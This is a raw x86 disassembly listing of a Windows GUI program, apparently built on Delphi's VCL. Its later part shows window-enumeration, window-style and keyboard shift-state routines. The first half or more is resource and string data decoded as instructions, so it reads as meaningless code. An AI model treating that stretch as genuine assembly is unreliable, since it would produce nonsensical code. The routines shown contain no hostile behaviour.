inc sp
add [ eax + 0x5 ] dl
inc esi
add [ esp + eax ] bl
inc esi
add al bh
inc esp
add al cl
add eax 0x8a940046
inc esp
add [ eax + 0x440044ce ] cl
iretd
sub_45cbaa
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esp + ecx + 0x46 ] ch
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dh
sbb [ esi ] eax
nop
sbb al 0x46
add [ ebx + ebx + 0x46 ] cl
add [ ebp - 0x5a6fffbc ] cl
inc esp
add al cl
sbb eax 0xa3f00046
inc esp
add [ eax - 0x30 ] ch
inc esp
add [ esp - 0x1da3ffba ] bh
inc esp
add ah ah
int3
sub_45cee4
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001f ] al
outsd
outsb
jae r-xdata
imul esi [ edi + ebp * 2 + 0x72 ] r-xdata
test al 0x1
add bh bh
xor [ esp + eax * 2 + 0x100 ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + ebp * 2 + 0x63 ] al
imul edx [ ebx + 0x69 ] 0x74
fcomp [ gs : edx ]
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add eax [ eax ]
add [ eax ] al
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6b00ffff ] ah
rol [ eax + eax - 0x48 ] 0x1
rol [ eax + eax ] 0x1
add [ eax ] al
add [ ecx ] 0x0
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
je r-xdata
and al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
outsd
arpl [ ebx + 0x4d ] bp
popad
outsb
popad
jb r-xdata
add [ eax ] al
jmp [ eax ]
sbb al [ eax + eax + 0x5d ]
outsd
outsb
add [ eax ] al
and [ eax ] al
add eax 0x336c7443
inc esp
add [ eax ] dl
inc eax
add [ edi - 0x1700ffff ] ah
rol [ eax + eax + 0x1 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push cs
push ebp
jae r-xdata
and al [ eax ]
push cs
inc esp
popa
jne r-xdata
lds eax [ ebp ]
xor [ edx ] eax
add bh bh
xor [ edx ] eax
add bh bh
[ esi ] al
add [ eax ] al
add [ eax + 0x3 ] al
sub_45cfe9
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edi ] al
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
add [ eax ] dl
inc eax
add [ ecx ] bl
add bh bh
nop
push 0x10044
add [ eax ] al
add [ eax ] al
add [ eax ] al
daa
add [ edx ] cl
push eax
popad
jb r-xdata
imul esp [ gs : edi + 0x68 ] 0x4010ac74
outsb
je r-xdata
dec ecx
arpl [ edi + 0x6e ] bp
add [ eax ] dl
inc eax
add [ 0x2dff0002 ] ch
add al [ eax ]
push eax
adc [ esi ] al
imul ebp [ ebp + 0x38 ] 0x80045b6
add al [ eax ]
push esp
out dx eax
inc ebp
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or eax [ eax ]
or eax 0x7a726f48
add [ edx + eax ] bh
add bh bh
cmp al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
push esp
adc [ eax ] al
dec esp
add [ eax ] al
inc [ edi + ebx * 2 + 0x44 ]
add [ ecx + eax + 0x46 ] ch
add [ eax - 0x80000000 ] al
add eax 0x65480600
imul esp [ edi + 0x68 ] 0x4010ac74
outsd
outsb
je r-xdata
inc ebp
add [ eax + 0x2 ] ah
add bh bh
sbb al 0x12
inc esi
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
jb r-xdata
add bh bh
xor al 0x2
add bh bh
add [ eax ] eax
sub eax [ edx ]
inc eax
add al [ eax ]
jmp esp
or [ eax + 0x65 ] cl
insb
jo r-xdata
add [ eax ] al
sub [ edx ] 0x0
and eax [ edx ]
push 0x58ff0000
push 0x68680044
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040028 ] al
outsd
outsb
je r-xdata
js r-xdata
je r-xdata
add [ esi ] cl
dec edi
bound ebp [ edx + 0x65 ]
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x500d0031 ] al
imul edi [ eax + 0x65 ] 0x6550736c
jb r-xdata
popad
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x480d000b ] al
outsd
jb r-xdata
les eax [ ebp ]
das
add al [ eax ]
jmp [ eax ]
add [ eax ] al
add [ eax + eax ] dh
insb
jae r-xdata
add [ eax ] 0x0
add [ eax + 0x50090032 ] al
outsd
insd
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor [ eax ] al
push cs
push eax
popad
jb r-xdata
arpl [ ebp + ecx * 2 + 0x65 ] si
outsb
jne r-xdata
ja r-xdata
or dl [ eax + 0x72 ]
imul ebp [ esi + 0x74 ] 0x6c616353
add [ gs : eax ] dl
outsb
and dh al
inc ebp
jo r-xdata
outsb
arpl [ eax + 0x50 ] bp
pop ecx
inc ebp
add [ eax + eax ] bh
[ edi ]
inc esp
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
or [ eax + 0x6f ] edx
add [ eax ] al
dec edi
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ cs : esi ] cl
dec edi
insb
inc ebx
jb r-xdata
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
add [ 0x35ff0002 ] dh
add al [ eax ]
push eax
adc [ esi ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
jmp edx
jo r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
outsb
je r-xdata
push 0x65
push esi
inc ebp
add [ eax + 0x2 ] cl
add bh bh
push 0xf0004612
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x654d0400
outsb
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or eax 0x65786950
jb r-xdata
inc eax
add [ eax - 0x53ffb9ec ] ah
adc al 0x46
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax + 0x1 ] al
xor eax 0x63530600
popad
insb
add [ fs : eax ] dl
inc eax
add dl ah
add al [ eax ]
outsb
jne r-xdata
outsb
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x5465646f
adc [ eax ] al
cmp al 0x14
inc esi
add [ eax + 0x14 ] dl
inc esi
adc [ eax ] al
xor al 0x2
add [ eax ] al
add [ eax ] al
sub al 0x0
or cl [ ebx + 0x65 ]
jns r-xdata
add bh bh
[ esi ] al
push ecx
xor al 0x0
inc esi
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
xor eax [ eax ]
or [ eax + 0x6f ] dl
jae r-xdata
lds eax [ ebp ]
xor [ edx ] al
add bh bh
test [ esi + eax * 2 ] dl
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax ] al
adc [ eax ] al
cdq
add [ eax ] al
push [ eax + ebp * 2 + 0x687c0044 ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x53080037 ] al
push 0x6948776f
outsb
je r-xdata
push ebx
outsb
popad
jo r-xdata
outsd
movsb [ edi ] [ esi ]
add al 0x46
add ah dl
xchg [ eax + eax ] eax
adc [ eax ] al
in al 0x2
add bh bh
in al 0x2
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
cmp [ eax ] al
or dl [ ebx + 0x6e ]
popad
jo r-xdata
push esi
imul esi [ ebx + 0x69 ] 0x54656c62
adc [ eax ] al
dec eax
add [ eax ] al
jmp [ eax ]
add [ eax ] al
add [ ecx ] bh
add [ edi ] al
jne r-xdata
add [ 0x74646957 ] al
push r-xdata
sub eax [ edx ]
add bh bh
pushfd
adc eax 0x10f00046
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp al [ eax ]
or edx [ edi + 0x69 ]
outsb
outsd
ja r-xdata
jb r-xdata
add [ eax ] al
inc eax
add [ eax ] al
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax 0x6e4f0b00
je r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
cmp [ eax ] eax
pop es
mov dh 0x45
add [ edx + eax ] cl
add bh bh
add al 0xf0
inc ebp
add al dh
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
or al 0x0
or eax 0x74726556
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
jne r-xdata
jpe r-xdata
popad
outsb
push edx
jae r-xdata
add [ eax ] al
cmp [ 0x6e4f0b00 ] 0x43
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
jmp [ esp + eax - 0x782bffba ]
[ esi ] al
jb r-xdata
push ecx
push esp
inc ebx
dec edi
outsb
pushfd
push ecx
inc ebp
add [ eax + 0x2 ] bl
add bh bh
inc eax
adc al [ esi ]
[ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp eax [ eax ]
or dl [ edi + 0x69 ]
outsb
outsd
ja r-xdata
add [ edi + ecx * 2 ] cl
popad
je r-xdata
push esp
and [ edx ] 0x44
add al cl
add [ eax ] al
dec eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f130041 ] al
outsb
inc ebx
outsd
outsb
jae r-xdata
pop eax
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
push esp
outsb
jne r-xdata
dec edi
outsb
inc esp
jb r-xdata
aam 0x1f
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0047 ] al
outsb
inc esp
popad
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
pop eax
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
push esp
outsb
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
fadd [ edx ]
add bh bh
fadd [ edx ]
add bh bh
[ esi ] al
jb r-xdata
add bh bh
[ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ edi ] al
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
nop
add al [ eax ]
call [ eax - 0xf00fffe ]
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ edi ] al
dec edi
outsb
pop eax
inc ecx
add [ eax - 0x7700fffe ] cl
add al [ eax ]
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
cmp al 0x0
or cl [ edi + 0x6e ]
inc ecx
arpl [ ecx + ebp * 2 + 0x76 ] si
popad
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f0d004c ] al
outsb
inc edi
je r-xdata
inc esp
jb r-xdata
jb r-xdata
jo r-xdata
rcr [ esi ] 0x1
jb r-xdata
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esp
add [ edx ] cl
dec edi
imul ebp [ esi + 0x65 ] 0x73655264
imul edi [ edx + 0x65 ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc edx
add [ esi ] cl
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
hlt
inc ebx
insb
outsd
jae r-xdata
adc [ edx ] ah
inc esp
add al al
add bh bh
[ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
add [ ecx ] cl
dec edi
outsb
dec ebx
jns r-xdata
imul esi [ ebp + 0x49 ] 0x546f666e
pop eax
inc ecx
outsb
outsw
push esp
jo r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec esi
add [ esi ] al
dec edi
outsb
dec eax
insb
jo r-xdata
pop ds
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09004b ] al
outsb
dec ecx
add [ edx ] cl
and [ eax + eax - 0x48 ] al
add [ eax ] eax
jbe r-xdata
jns r-xdata
outsb
inc esp
jae r-xdata
add [ eax + 0x4f090045 ] al
js r-xdata
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
test [ ecx ] ah
inc esp
add al dl
push ds
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edx
add [ edx ] cl
dec edi
outsb
inc esp
jb r-xdata
add [ eax - 0x4f00fffe ] dh
add al [ eax ]
push eax
adc [ esi ] al
sbb eax 0x1d80044
add bh bh
fadd [ ecx ]
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x7c ] bp
and [ eax + eax - 0x30 ] eax
or [ edi + 0x6e ] ecx
jb r-xdata
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0048 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
pop eax
inc ecx
add [ eax - 0x5f00fffe ] ah
add al [ eax ]
push eax
push eax
outsd
jo r-xdata
loopne r-xdata
jo r-xdata
sbb eax 0xd80044
add bh bh
fadd [ eax ]
add bh bh
[ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ebx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
or al 0x1e
inc esp
add al ah
add [ eax ] eax
jmp eax
add [ eax ] al
add [ eax - 0x80000000 ] al
dec edi
jbe r-xdata
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
dec edi
inc esp
add al ch
add [ eax ] al
push ds
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc esi
mov al [ 0xfffffffff0ff0002 ]
jo r-xdata
add bh bh
[ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esp
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
sbb al 0x44
add al dl
add [ eax ] al
call eax
add [ eax ] al
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edx
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
push 0x446c6565
outsd
ja r-xdata
dec ebp
outsd
jbe r-xdata
dec ebp
add [ esi ] al
dec edi
outsb
dec eax
imul esp [ ebp + 0x74 ] 0xa80045c7
add al [ eax ]
[ eax + 0x1ff0002 ]
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebp
add [ ecx ] cl
dec edi
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc ebx
add [ eax ] cl
dec edi
outsb
inc ebx
jb r-xdata
pop eax
inc ecx
add al dl
add al [ eax ]
call eax
add al [ eax ]
push eax
adc [ esi ] al
outsd
jne r-xdata
push ebp
jo r-xdata
insb
cwde
inc esp
outsd
ja r-xdata
cmp bh al
inc ebp
add al al
add al [ eax ]
inc eax
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a005a ] al
cwde
and eax [ eax + eax + 0x48 ]
add [ eax ] eax
dec [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push edi
add [ esi ] cl
dec edi
outsb
dec ebp
dec ebp
outsd
jne r-xdata
adc [ edi + 0x6e ] cl
in al 0x1c
inc esp
add al ah
add [ eax ] al
jmp eax
pop eax
inc ecx
add al cl
add al [ eax ]
dec eax
add al [ eax ]
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ebx
add [ esi ] al
dec edi
outsb
push ebx
push 0x2138776f
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b005c ] al
outsb
push ebx
je r-xdata
push edi
push 0x556c6565
jo r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c0055 ] al
outsb
dec ebp
outsd
jne r-xdata
and eax [ eax + eax + 0x38 ]
add [ eax ] eax
jae r-xdata
push edi
pop esp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dl bl
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + ebx * 8 - 0x2613ffbb ] dh
inc ebp
add al bh
push esp
inc esi
add [ eax ] cl
xor al [ eax ]
and al 0x32
inc eax
add [ eax ] cl
cli
inc ebp
inc ebp
add [ esp + esi + 0x1e0c0040 ] dh
jb r-xdata
outsb
push ebx
push 0x4374726f
jne r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
pop edx
add [ edx ] cl
dec edi
pop eax
inc ecx
add [ eax - 0x4700fffe ] bh
add al [ eax ]
push eax
adc [ esi ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop eax
add [ edi ] al
dec edi
outsb
push eax
popad
imul ebp [ esi + 0x74 ] r-xdata
clc
add [ eax ] al
and eax [ eax + eax + 0x40 ]
add [ eax ] eax
inc [ eax + 0x1 ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push esi
add [ eax ] dl
dec edi
outsb
push edi
push 0x986c6565
je r-xdata
jpe r-xdata
add [ ebx + ebx * 8 + 0x44 ] ch
add [ eax - 0x1 ] bh
inc ebp
add [ ebx + ecx * 4 + 0x41 ] cl
add [ esp + eax * 2 + 0x46 ] ch
add [ esp + edi * 8 ] al
inc ebp
add [ eax ] dl
std
inc ebp
add [ ebp + 0x44 ] cl
add ah dh
cmovb eax [ eax ]
mov [ 0xcd40046 ] al
inc edx
add [ eax ] ch
inc ecx
inc esi
add [ eax ] al
inc ebx
inc esi
add [ eax - 0x63ffbb2a ] al
fild [ eax + eax - 0x18 ]
fiadd [ eax + eax - 0x58 ]
pop edx
inc esp
add ah bh
rol [ eax + eax + 0x68 ] 0x1
add al [ esi ]
xor al 0xce
inc esp
add al dh
pop ecx
inc esp
add ah dh
pop ecx
inc esp
add [ ebx + eax + 0x46 ] bl
add [ eax ] dl
mov al [ eax + eax + 0x34 ]
inc esp
add [ ebx + ebx * 2 + 0x44 ] ch
add al al
inc sp
add [ eax + 0x5 ] dl
inc esi
add [ esp + eax ] bl
inc esi
add al bh
inc esp
add al cl
add eax 0x8a940046
inc esp
add [ eax + 0x440044ce ] cl
iretd
add al [ eax ]
add al dl
mov [ ebp ] sub_420fdc
in al dx
test [ ebp ] r-xdata
mov ah 0x34
inc eax
add [ esi + ebx ] cl
inc esp
mov ah 0xd9
inc ebp
add ah ch
fld [ ebp ]
clc
outsd
arpl [ ebx - 0x34 ] bp
and [ eax + eax - 0x10 ] al
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f08005d ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
rol al 0xd8
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fiadd [ ebp ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
popad
sub_45d94a
inc esp
add [ eax - 0xc ] ch
inc ebp
add [ esp + ecx + 0x46 ] ch
add ah dh
movsb [ edi ] [ esi ]
inc esp
add [ eax ] dh
sbb [ esi ] eax
nop
sbb al 0x46
add [ ebx + ebx + 0x46 ] cl
add [ ebp - 0x5a6fffbc ] cl
inc esp
add al cl
sbb eax 0xa3f00046
inc esp
add [ eax - 0x30 ] ch
inc esp
add [ esp - 0x1da3ffba ] bh
inc esp
add ah ah
int3
sub_45dc74
push ebx
push esi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
push 0xffffffec
push esi
call GetWindowLongA
test bl bl
je r-xdata
test ah 0x2
je r-xdata
test ah 0x2
jne r-xdata
and eax 0xfffffdff
or eax 0x200
jmp r-xdata
push eax
push 0xffffffec
push esi
call SetWindowLongA
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetWindowPos
sub_45dcc0
mov eax [ rw-data ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
xor edx edx
mov eax [ rw-data ]
call sub_4674b8
mov eax [ rw-data ]
call sub_420b0c
mov eax [ rw-data ]
call sub_420ab4
retn
push 0x0
push eax
call ShowOwnedPopups
sub_45dcf8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
mov eax 0x8
call sub_4026f4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
push 0x0
push ebx
call EnableWindow
sub_45dd48
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
xor edx edx
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp - 0x8 ] edx
mov edx [ rw-data ]
mov [ ebp - 0xc ] edx
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
push ebp
push sub_45ddeb
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_45ddb4
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push sub_45dcf8
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov eax [ rw-data ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45ddf2
mov eax [ ebp - 0xc ]
mov [ rw-data ] eax
mov eax [ ebp - 0x8 ]
mov [ rw-data ] eax
retn
sub_45ddfc
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov ebx esi
mov eax [ ebx + 0x4 ]
push eax
call IsWindow
test eax eax
je r-xdata
mov esi [ ebx ]
mov edx 0x8
mov eax ebx
call sub_402714
test esi esi
jne r-xdata
push 0xffffffff
mov eax [ ebx + 0x4 ]
push eax
call EnableWindow
sub_45de34
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx [ rw-data ]
je r-xdata
or eax 0xffffffff
pop ebx
pop ebp
retn 0x8
mov eax [ rw-data ]
cmp ebx [ eax + 0x30 ]
je r-xdata
push ebx
call IsWindowVisible
test eax eax
je r-xdata
push ebx
call IsWindowEnabled
test eax eax
je r-xdata
push 0xffffffec
push ebx
call GetWindowLongA
test al 0x8
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
jmp r-xdata
sub_45de98
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
push 0x0
push sub_45de34
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
retn
mov eax [ rw-data ]
retn
sub_45def4
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0xc ]
or edx 0xffffffff
mov ecx eax
mov ebx [ ecx ]
cmp ebx [ ebp + 0x8 ]
jne r-xdata
mov eax edx
pop ebx
pop ebp
retn 0x8
xor edx edx
mov [ ecx + 0x4 ] 0x1
sub_45df14
add esp 0xfffffff8
call GetActiveWindow
mov [ esp ] eax
mov [ esp + 0x4 ] 0x0
mov eax esp
push eax
push sub_45def4
call GetCurrentThreadId
push eax
call EnumThreadWindows
mov al [ esp + 0x4 ]
pop ecx
pop edx
retn
sub_45df40
push ebx
push esi
push edi
push ebp
mov ebp eax
mov eax [ rw-data ]
call sub_464a98
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ rw-data ]
call sub_464f08
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
xor ebx ebx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e8c
test eax eax
je r-xdata
mov eax ebx
pop ebp
pop edi
pop esi
pop ebx
retn
inc edi
dec esi
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464a84
mov ebx eax
test [ ebx + 0x1d ] 0x2
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464ef4
mov ebx eax
mov edx [ ebx + 0x8 ]
mov eax ebp
call sub_407e8c
test eax eax
je r-xdata
sub_45dfc0
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test si 0x4
je r-xdata
test si 0x8
je r-xdata
or bl 0x1
test si 0x1
je r-xdata
or bl 0x4
test si 0x2
je r-xdata
or bl 0x8
test si 0x10
je r-xdata
or bl 0x10
push 0x12
call GetKeyState
test ax ax
jge r-xdata
or bl 0x20
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45e014
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
push 0x10
call GetKeyState
test ax ax
jge r-xdata
push 0x11
call GetKeyState
test ax ax
jge r-xdata
or bl 0x1
test esi 0x20000000
je r-xdata
or bl 0x4
mov eax ebx
pop esi
pop ebx
retn
or bl 0x2
sub_45e050
push ebx
push esi
mov esi eax
mov bl [ r-xdata ]
test [ esi + 0x10 ] 0x80
je r-xdata
test [ esi + 0x11 ] 0x80
je r-xdata
or bl 0x1
test [ esi + 0x12 ] 0x80
je r-xdata
or bl 0x4
test [ esi + 0x1 ] 0x80
je r-xdata
or bl 0x2
test [ esi + 0x2 ] 0x80
je r-xdata
or bl 0x8
test [ esi + 0x4 ] 0x80
je r-xdata
or bl 0x10
mov eax ebx
pop esi
pop ebx
retn
or bl 0x20
sub_45e09c
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_45e0fa
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_45b314
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_4041d0
mov eax [ ebp - 0x8 ]
pop edx
call sub_407e8c
test eax eax
sete al
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e101
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_40400c
retn
sub_45e10c
push ebx
mov ebx eax
jmp r-xdata
mov eax [ ebx + 0x30 ]
test eax eax
jne r-xdata
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
pop ebx
retn
sub_45e134
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
xor edx edx
mov [ ebp - 0xc ] edx
mov esi eax
xor eax eax
push ebp
push sub_45e1a5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_45e10c
mov ebx eax
test ebx ebx
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45e1ac
lea eax [ ebp - 0xc ]
call sub_403fe8
retn
mov eax [ esi + 0x8 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x8 ]
push eax
push 0x0
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405d6c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_403a24
sub_45e1b4
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403240
mov [ edi + 0x4 ] esi
mov al [ ebp + 0x8 ]
mov [ edi + 0x18 ] al
mov cx 0x50
mov [ edi + 0xa ] cx
movzx eax cx
mov ecx 0xa
xor edx edx
div ecx
mov [ edi + 0x8 ] ax
mov [ edi + 0x1c ] 0x1
mov [ edi + 0x20 ] 0xa
mov [ edi + 0x40 ] 0x4
mov [ edi + 0x3c ] 0xc
mov [ edi + 0x28 ] 0xff000014
mov [ edi + 0x2c ] 0x1
